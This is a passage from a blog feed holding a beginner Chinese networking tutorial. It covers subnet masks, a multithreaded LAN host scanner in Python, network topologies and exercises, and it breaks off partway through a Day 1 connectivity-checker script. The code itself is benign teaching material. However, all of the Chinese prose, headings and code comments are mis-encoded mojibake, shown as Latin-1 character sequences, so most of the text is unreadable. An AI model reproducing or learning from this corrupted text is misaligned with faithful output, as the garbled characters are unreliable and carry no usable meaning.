class="hljs-comment"># è·å–ç½‘ç»œä¸­çš„æ‰€æœ‰ä¸»æœºIP</span><br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> network.hosts():<br>    <span class="hljs-built_in">print</span>(ip)  <span class="hljs-comment"># 192.168.1.1, 192.168.1.2, ..., 192.168.1.254</span><br></code></pre></td></tr></table></figure><h3 id="2-å­ç½‘æ©ç -24-æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ">2. å­ç½‘æ©ç  /24 æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> çš„å«ä¹‰ï¼š<br><br>/<span class="hljs-number">24</span> è¡¨ç¤ºå­ç½‘æ©ç æœ‰<span class="hljs-number">24</span>ä¸ª<span class="hljs-number">1</span>ï¼š<br><span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">11111111</span>.<span class="hljs-number">00000000</span><br>å³ï¼š<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span><br><br>å¯ç”¨IPèŒƒå›´ï¼š<br><span class="hljs-number">192.168.1.1</span> åˆ° <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">254</span>ï¼ˆå…±<span class="hljs-number">254</span>ä¸ªï¼‰<br><span class="hljs-number">192.168.1.0</span> æ˜¯ç½‘ç»œåœ°å€<br><span class="hljs-number">192.168.1.255</span> æ˜¯å¹¿æ’­åœ°å€<br></code></pre></td></tr></table></figure><h3 id="3-ThreadPoolExecutor-å¹¶å‘æ‰«æ">3. ThreadPoolExecutor å¹¶å‘æ‰«æ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-comment"># åˆ›å»ºçº¿ç¨‹æ± ï¼Œæœ€å¤š50ä¸ªçº¿ç¨‹åŒæ—¶å·¥ä½œ</span><br><span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> executor:<br>    <span class="hljs-comment"># æäº¤ä»»åŠ¡</span><br>    futures = [executor.submit(scan_ip, ip) <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> ip_list]<br><br>    <span class="hljs-comment"># ç­‰å¾…å®Œæˆ</span><br>    <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):<br>        result = future.result()<br></code></pre></td></tr></table></figure><p><strong>ä¸ºä»€ä¹ˆè¦ç”¨å¤šçº¿ç¨‹ï¼Ÿ</strong></p><ul><li>å•çº¿ç¨‹æ‰«æ254ä¸ªIPéœ€è¦å¾ˆé•¿æ—¶é—´</li><li>å¤šçº¿ç¨‹å¯ä»¥åŒæ—¶æ‰«æå¤šä¸ªIPï¼Œå¤§å¤§æé«˜æ•ˆç‡</li><li>50ä¸ªçº¿ç¨‹å¯ä»¥è®©æ‰«æé€Ÿåº¦æå‡å‡ åå€</li></ul><h3 id="4-connect-exæ–¹æ³•">4. connect_exæ–¹æ³•</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">result = sock.connect_ex((ip, port))<br><br><span class="hljs-comment"># è¿”å›å€¼ï¼š</span><br><span class="hljs-comment"># 0 = è¿æ¥æˆåŠŸ</span><br><span class="hljs-comment"># å…¶ä»– = è¿æ¥å¤±è´¥ï¼ˆé”™è¯¯ç ï¼‰</span><br></code></pre></td></tr></table></figure><p>è¿™æ¯”æ™®é€šçš„<code>connect()</code>æ–¹æ³•æ›´å¥½ï¼Œå› ä¸ºå¤±è´¥æ—¶ä¸ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><h3 id="ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ">ä»Šå¤©å­¦åˆ°äº†ä»€ä¹ˆï¼Ÿ</h3><ol><li>âœ… ç½‘ç»œæŒ‰èŒƒå›´åˆ†ä¸ºLANã€MANã€WAN</li><li>âœ… å®¶åº­å’ŒåŠå…¬å®¤ç½‘ç»œæ˜¯å±€åŸŸç½‘ï¼ˆLANï¼‰</li><li>âœ… ç½‘ç»œæ‹“æ‰‘ç»“æ„æœ‰5ç§ï¼šæ€»çº¿ã€æ˜Ÿå‹ã€ç¯å‹ã€ç½‘çŠ¶ã€æ ‘å‹</li><li>âœ… ç°ä»£ç½‘ç»œæœ€å¸¸ç”¨æ˜Ÿå‹æ‹“æ‰‘ç»“æ„</li><li>âœ… å­ç½‘çš„æ¦‚å¿µå’Œè¡¨ç¤ºæ–¹æ³•</li><li>âœ… å¦‚ä½•æ‰«æå±€åŸŸç½‘å†…çš„è®¾å¤‡</li></ol><h3 id="é‡è¦æ¦‚å¿µ">é‡è¦æ¦‚å¿µ</h3><table><thead><tr><th>æ¦‚å¿µ</th><th>è§£é‡Š</th><th>ä¾‹å­</th></tr></thead><tbody><tr><td>å±€åŸŸç½‘</td><td>å°èŒƒå›´çš„ç½‘ç»œ</td><td>å®¶åº­WiFi</td></tr><tr><td>æ˜Ÿå‹æ‹“æ‰‘</td><td>æ‰€æœ‰è®¾å¤‡è¿æ¥åˆ°ä¸­å¿ƒèŠ‚ç‚¹</td><td>æ‰€æœ‰ç”µè„‘è¿æ¥åˆ°è·¯ç”±å™¨</td></tr><tr><td>å­ç½‘</td><td>ä¸€ä¸ªç½‘ç»œçš„å­é›†</td><td>192.168.1.0/24</td></tr><tr><td>ä¸»æœº</td><td>ç½‘ç»œä¸­çš„è®¾å¤‡</td><td>ä½ çš„ç”µè„‘ã€æ‰‹æœº</td></tr></tbody></table><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šè¯†åˆ«æ‹“æ‰‘ç±»å‹">ç»ƒä¹ 1ï¼šè¯†åˆ«æ‹“æ‰‘ç±»å‹</h3><p>è¯´å‡ºä»¥ä¸‹åœºæ™¯ä½¿ç”¨çš„æ˜¯ä»€ä¹ˆæ‹“æ‰‘ç»“æ„ï¼š</p><ol><li>æ‰€æœ‰æ•™å®¤çš„ç”µè„‘éƒ½è¿æ¥åˆ°æœºæˆ¿çš„äº¤æ¢æœº</li><li>åœ°é“13å·çº¿å„ä¸ªç«™ç‚¹çš„è¿æ¥</li><li>äº’è”ç½‘éª¨å¹²ç½‘çš„è¿æ¥æ–¹å¼</li></ol><h3 id="ç»ƒä¹ 2ï¼šä¿®æ”¹æ‰«æå™¨">ç»ƒä¹ 2ï¼šä¿®æ”¹æ‰«æå™¨</h3><p>ä¿®æ”¹ç¨‹åºï¼Œè®©å®ƒå¯ä»¥ï¼š</p><ol><li>æ‰«æè‡ªå®šä¹‰çš„å­ç½‘ï¼ˆä¸æ˜¯é»˜è®¤çš„/24ï¼‰</li><li>æ˜¾ç¤ºæ¯ä¸ªè®¾å¤‡çš„å“åº”æ—¶é—´</li><li>ä¿å­˜æ‰«æç»“æœåˆ°æ–‡ä»¶</li></ol><h3 id="ç»ƒä¹ 3ï¼šè®¡ç®—é¢˜">ç»ƒä¹ 3ï¼šè®¡ç®—é¢˜</h3><p>ä¸€ä¸ª192.168.1.0/24çš„ç½‘ç»œï¼š</p><ol><li>å­ç½‘æ©ç æ˜¯å¤šå°‘ï¼Ÿ</li><li>ç¬¬ä¸€ä¸ªå¯ç”¨IPæ˜¯å¤šå°‘ï¼Ÿ</li><li>æœ€åä¸€ä¸ªå¯ç”¨IPæ˜¯å¤šå°‘ï¼Ÿ</li><li>æ€»å…±æœ‰å¤šå°‘ä¸ªå¯ç”¨IPï¼Ÿ</li></ol><h3 id="ç»ƒä¹ 4ï¼šç»˜åˆ¶æ‹“æ‰‘å›¾">ç»ƒä¹ 4ï¼šç»˜åˆ¶æ‹“æ‰‘å›¾</h3><p>ç»˜åˆ¶ä½ å®¶é‡Œæˆ–å…¬å¸çš„ç½‘ç»œæ‹“æ‰‘ç»“æ„å›¾ï¼Œæ ‡æ³¨ï¼š</p><ul><li>æ‰€æœ‰è®¾å¤‡ï¼ˆç”µè„‘ã€æ‰‹æœºã€æ‰“å°æœºç­‰ï¼‰</li><li>è·¯ç”±å™¨/äº¤æ¢æœº</li><li>è¿æ¥æ–¹å¼ï¼ˆæœ‰çº¿/æ— çº¿ï¼‰</li></ul><h2 id="ğŸ“š-æ‰©å±•é˜…è¯»">ğŸ“š æ‰©å±•é˜…è¯»</h2><h3 id="ä¸ºä»€ä¹ˆæ˜Ÿå‹æ‹“æ‰‘æœ€æµè¡Œï¼Ÿ">ä¸ºä»€ä¹ˆæ˜Ÿå‹æ‹“æ‰‘æœ€æµè¡Œï¼Ÿ</h3><p><strong>å†å²åŸå› </strong>ï¼š</p><ul><li>æ—©æœŸä½¿ç”¨æ€»çº¿å‹æ‹“æ‰‘ï¼ˆ10BASE-2åŒè½´ç”µç¼†ï¼‰</li><li>é—®é¢˜ï¼šä¸€æ ¹çº¿æ–­äº†ï¼Œæ‰€æœ‰è®¾å¤‡éƒ½ä¸èƒ½ç”¨</li><li>æ˜Ÿå‹æ‹“æ‰‘è§£å†³äº†è¿™ä¸ªé—®é¢˜</li></ul><p><strong>ç°ä»£ä¼˜åŠ¿</strong>ï¼š</p><ul><li>ä¾¿äºç®¡ç†ï¼šå¯ä»¥åœ¨äº¤æ¢æœºä¸Šç®¡ç†æ¯ä¸ªç«¯å£</li><li>æ˜“äºæ’é”™ï¼šæŸä¸ªè®¾å¤‡æ•…éšœä¸å½±å“å…¶ä»–è®¾å¤‡</li><li>æ˜“äºæ‰©å±•ï¼šåªéœ€åœ¨äº¤æ¢æœºä¸Šå¢åŠ ç«¯å£</li><li>æ€§èƒ½å¥½ï¼šäº¤æ¢æœºå¯ä»¥æ™ºèƒ½è½¬å‘æ•°æ®</li></ul><h3 id="å®¶åº­ç½‘ç»œçš„å®é™…æ‹“æ‰‘">å®¶åº­ç½‘ç»œçš„å®é™…æ‹“æ‰‘</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs 1c">äº’è”ç½‘<br>  <span class="hljs-string">|</span><br>å…‰çŒ«<br>  <span class="hljs-string">|</span><br>è·¯ç”±å™¨ï¼ˆWiFiï¼‰<br>  <span class="hljs-string">|</span><br>  <span class="hljs-string">|---- ç”µè„‘ï¼ˆæœ‰çº¿ï¼‰</span><br>  <span class="hljs-string">|---- æ‰‹æœºï¼ˆæ— çº¿ï¼‰</span><br>  <span class="hljs-string">|---- å¹³æ¿ï¼ˆæ— çº¿ï¼‰</span><br>  <span class="hljs-string">|---- æ™ºèƒ½ç”µè§†ï¼ˆæœ‰çº¿ï¼‰</span><br>  <span class="hljs-string">|---- æ™ºèƒ½éŸ³ç®±ï¼ˆæ— çº¿ï¼‰</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„<strong>æ˜Ÿå‹æ‹“æ‰‘</strong>ï¼</p><h3 id="ä¼ä¸šç½‘ç»œçš„æ‹“æ‰‘">ä¼ä¸šç½‘ç»œçš„æ‹“æ‰‘</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">     æ ¸å¿ƒäº¤æ¢æœºï¼ˆæ ¹ï¼‰<br>       /      <span class="hljs-string">\</span><br>  äº¤æ¢æœºA    äº¤æ¢æœºB<br>  /   <span class="hljs-string">\</span>       /   <span class="hljs-string">\</span><br>ç”µè„‘<span class="hljs-number">1</span> ç”µè„‘<span class="hljs-number">2</span> ç”µè„‘<span class="hljs-number">3</span> ç”µè„‘<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ª<strong>æ ‘å‹æ‹“æ‰‘</strong>ï¼ˆä¹Ÿå«åˆ†å±‚æ˜Ÿå‹æ‹“æ‰‘ï¼‰ï¼</p><h2 id="ğŸ¯-æ˜å¤©é¢„å‘Š">ğŸ¯ æ˜å¤©é¢„å‘Š</h2><p><strong>ç¬¬3å¤©ï¼šOSIä¸ƒå±‚æ¨¡å‹</strong></p><p>æˆ‘ä»¬å°†å­¦ä¹ ï¼š</p><ul><li>ä»€ä¹ˆæ˜¯OSIä¸ƒå±‚æ¨¡å‹ï¼Ÿ</li><li>æ¯ä¸€å±‚åšä»€ä¹ˆï¼Ÿ</li><li>ä¸ºä»€ä¹ˆè¦åˆ†å±‚ï¼Ÿ</li><li>ç¼–å†™ç¨‹åºåˆ†æå„å±‚çš„ä½œç”¨</li></ul><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼šç½‘ç»œæ‹“æ‰‘å°±åƒåŸå¸‚è§„åˆ’ï¼Œä¸åŒçš„ç»“æ„æœ‰ä¸åŒçš„ä¼˜ç¼ºç‚¹ï¼</p><p>ğŸ‘‰ <a href="day01.md">ä¸Šä¸€å¤©ï¼šè®¤è¯†è®¡ç®—æœºç½‘ç»œ</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day03.md">ä¸‹ä¸€å¤©ï¼šOSIä¸ƒå±‚æ¨¡å‹</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1å¤©ï¼šè®¤è¯†è®¡ç®—æœºç½‘ç»œ</title>
    <link href="/2025/11/10/1%E5%A4%A9%EF%BC%9A%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    <url>/2025/11/10/1%E5%A4%A9%EF%BC%9A%E8%AE%A4%E8%AF%86%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬1å¤©ï¼šè®¤è¯†è®¡ç®—æœºç½‘ç»œ</h1><blockquote><p>â€œäº’è”ç½‘å°±åƒä¸€å¼ å·¨å¤§çš„èœ˜è››ç½‘ï¼Œè¿æ¥ç€å…¨ä¸–ç•Œçš„è®¡ç®—æœºã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£ä»€ä¹ˆæ˜¯è®¡ç®—æœºç½‘ç»œ</li><li>äº†è§£ç½‘ç»œçš„ä½œç”¨å’Œé‡è¦æ€§</li><li>ç¼–å†™ç¬¬ä¸€ä¸ªç½‘ç»œç¨‹åºï¼šæ£€æµ‹ç½‘ç»œè¿æ¥</li></ul><h2 id="ğŸ¯-ä»€ä¹ˆæ˜¯è®¡ç®—æœºç½‘ç»œï¼Ÿ">ğŸ¯ ä»€ä¹ˆæ˜¯è®¡ç®—æœºç½‘ç»œï¼Ÿ</h2><h3 id="ç”Ÿæ´»åŒ–ç†è§£">ç”Ÿæ´»åŒ–ç†è§£</h3><p>æƒ³è±¡ä¸€ä¸‹ä½ åœ¨ç”¨å¾®ä¿¡èŠå¤©ï¼š</p><ol><li>ä½ åœ¨åŒ—äº¬å‘äº†ä¸€æ¡æ¶ˆæ¯</li><li>ä½ çš„æœ‹å‹åœ¨ä¸Šæµ·æ”¶åˆ°äº†è¿™æ¡æ¶ˆæ¯</li><li>ä¸­é—´å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ</li></ol><p>è¿™å°±æ˜¯è®¡ç®—æœºç½‘ç»œåœ¨å·¥ä½œï¼</p><p><strong>è®¡ç®—æœºç½‘ç»œ</strong>å°±æ˜¯æŠŠåˆ†æ•£åœ¨ä¸åŒåœ°ç‚¹çš„è®¡ç®—æœºé€šè¿‡é€šä¿¡çº¿è·¯è¿æ¥èµ·æ¥ï¼Œå®ç°èµ„æºå…±äº«å’Œä¿¡æ¯ä¼ é€’çš„ç³»ç»Ÿã€‚</p><h3 id="ç½‘ç»œçš„ä¸‰ä¸ªå…³é”®è¦ç´ ">ç½‘ç»œçš„ä¸‰ä¸ªå…³é”®è¦ç´ </h3><ol><li><strong>è®¡ç®—æœº</strong>ï¼ˆèŠ‚ç‚¹ï¼‰ï¼šå‘é€å’Œæ¥æ”¶ä¿¡æ¯çš„è®¾å¤‡</li><li><strong>é€šä¿¡çº¿è·¯</strong>ï¼ˆé“¾è·¯ï¼‰ï¼šä¼ è¾“ä¿¡æ¯çš„ä»‹è´¨ï¼ˆç½‘çº¿ã€WiFiã€å…‰çº¤ç­‰ï¼‰</li><li><strong>åè®®</strong>ï¼ˆè§„åˆ™ï¼‰ï¼šè®¡ç®—æœºä¹‹é—´äº¤æµçš„&quot;è¯­è¨€&quot;</li></ol><h3 id="ç±»æ¯”ç†è§£">ç±»æ¯”ç†è§£</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">è®¡ç®—æœºç½‘ç»œ <span class="hljs-operator">=</span> å¿«é€’ç³»ç»Ÿ<br><br>ä½ çš„ç”µè„‘  â†’  å¯„ä»¶äºº<br>ç½‘ç»œçº¿è·¯  â†’  å¿«é€’è½¦ã€é£æœº<br>è·¯ç”±å™¨    â†’  ä¸­è½¬ç«™<br>åè®®      â†’  åŒ…è£¹è§„æ ¼ã€è¿è¾“è§„åˆ™<br>ç›®æ ‡ç”µè„‘  â†’  æ”¶ä»¶äºº<br></code></pre></td></tr></table></figure><h2 id="ğŸ’¡-ç½‘ç»œèƒ½åšä»€ä¹ˆï¼Ÿ">ğŸ’¡ ç½‘ç»œèƒ½åšä»€ä¹ˆï¼Ÿ</h2><h3 id="1-èµ„æºå…±äº«">1. èµ„æºå…±äº«</h3><ul><li>å…±äº«æ‰“å°æœº</li><li>å…±äº«æ–‡ä»¶</li><li>å…±äº«æ•°æ®åº“</li></ul><h3 id="2-ä¿¡æ¯ä¼ é€’">2. ä¿¡æ¯ä¼ é€’</h3><ul><li>å‘é€é‚®ä»¶</li><li>ç½‘é¡µæµè§ˆ</li><li>è§†é¢‘é€šè¯</li><li>åœ¨çº¿æ¸¸æˆ</li></ul><h3 id="3-åˆ†å¸ƒå¼è®¡ç®—">3. åˆ†å¸ƒå¼è®¡ç®—</h3><ul><li>äº‘è®¡ç®—</li><li>åŒºå—é“¾</li><li>å¤§æ•°æ®å¤„ç†</li></ul><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šæ£€æµ‹ç½‘ç»œè¿æ¥">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šæ£€æµ‹ç½‘ç»œè¿æ¥</h2><p>è®©æˆ‘ä»¬ç¼–å†™ç¬¬ä¸€ä¸ªç½‘ç»œç¨‹åºï¼è¿™ä¸ªç¨‹åºä¼šæ£€æµ‹ä½ çš„ç”µè„‘æ˜¯å¦è¿æ¥åˆ°äº’è”ç½‘ã€‚</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day01_network_checker.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šæ£€æµ‹ç½‘ç»œè¿æ¥çŠ¶æ€</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_internet_connection</span>(<span class="hljs-params">host=<span class="hljs-string">&quot;8.8.8.8&quot;</span>, port=<span class="hljs-number">53</span>, timeout=<span class="hljs-number">3</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    æ£€æµ‹æ˜¯å¦èƒ½è¿æ¥åˆ°äº’è”ç½‘</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å‚æ•°è¯´æ˜ï¼š</span><br><span class="hljs-string">        host: ç›®æ ‡ä¸»æœºIPåœ°å€ï¼ˆé»˜è®¤ä½¿ç”¨Googleçš„DNSæœåŠ¡å™¨ 8.8.8.8ï¼‰</span><br><span class="hljs-string">        port: ç›®æ ‡ç«¯å£ï¼ˆ53æ˜¯DNSæœåŠ¡çš„æ ‡å‡†ç«¯å£ï¼‰</span><br><span class="hljs-string">        timeout: è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰</span><br><span class="hljs-string"></span><br><span class="hljs-string">    è¿”å›å€¼ï¼š</span><br><span class="hljs-string">        True: ç½‘ç»œè¿æ¥æ­£å¸¸</span><br><span class="hljs-string">        False: ç½‘ç»œè¿æ¥å¤±è´¥</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å·¥ä½œåŸç†ï¼š</span><br><span class="hljs-string">        å°è¯•åˆ›å»ºä¸€ä¸ªsocketè¿æ¥åˆ°æŒ‡å®šçš„æœåŠ¡å™¨</span><br><span class="hljs-string">        å¦‚æœèƒ½è¿æ¥æˆåŠŸï¼Œè¯´æ˜ç½‘ç»œæ˜¯é€šçš„</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªsocketå¯¹è±¡</span><br>        <span class="hljs-comment"># AF_INETè¡¨ç¤ºIPv4åœ°å€</span><br>        <span class="hljs-comment"># SOCK_STREAMè¡¨ç¤ºTCPåè®®</span><br>        socket.setdefaulttimeout(timeout)<br>        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br>        <span class="hljs-comment"># å°è¯•è¿æ¥åˆ°ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£</span><br>        sock.connect((host, port))<br><br>        <span class="hljs-comment"># è¿æ¥æˆåŠŸï¼Œå…³é—­socket</span><br>        sock.close()<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-comment"># è¿æ¥å¤±è´¥ï¼Œè¯´æ˜ç½‘ç»œä¸é€š</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è¿æ¥å¤±è´¥ï¼š<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ip</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è·å–æœ¬æœºçš„IPåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">    å·¥ä½œåŸç†ï¼š</span><br><span class="hljs-string">        åˆ›å»ºä¸€ä¸ªUDP socketï¼Œè¿æ¥åˆ°å¤–éƒ¨åœ°å€ï¼ˆä¸ä¼šçœŸæ­£å‘é€æ•°æ®ï¼‰</span><br><span class="hljs-string">        é€šè¿‡è¿™ä¸ªsocketè·å–æœ¬æœºçš„IPåœ°å€</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># åˆ›å»ºUDP socket</span><br>        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br><br>        <span class="hljs-comment"># è¿æ¥åˆ°ä¸€ä¸ªå¤–éƒ¨åœ°å€ï¼ˆè¿™é‡Œä¸ä¼šçœŸæ­£å‘é€æ•°æ®ï¼‰</span><br>        <span class="hljs-comment"># ä½¿ç”¨Googleçš„DNSæœåŠ¡å™¨åœ°å€</span><br>        sock.connect((<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">80</span>))<br><br>        <span class="hljs-comment"># è·å–æœ¬æœºçš„IPåœ°å€</span><br>        local_ip = sock.getsockname()[<span class="hljs-number">0</span>]<br><br>        sock.close()<br>        <span class="hljs-keyword">return</span> local_ip<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æ— æ³•è·å–IPåœ°å€&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_hostname</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è·å–è®¡ç®—æœºçš„ä¸»æœºå</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> socket.gethostname()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;æœªçŸ¥ä¸»æœºå&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°ï¼šæ‰§è¡Œç½‘ç»œæ£€æµ‹å¹¶æ˜¾ç¤ºç»“æœ</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç½‘ç»œè¿æ¥æ£€æµ‹å·¥å…·&quot;</span>.center(<span class="hljs-number">50</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">50</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># è·å–ä¸»æœºå</span><br>    hostname = get_hostname()<br>    <span class="hljs-built_in">print</span>(<span 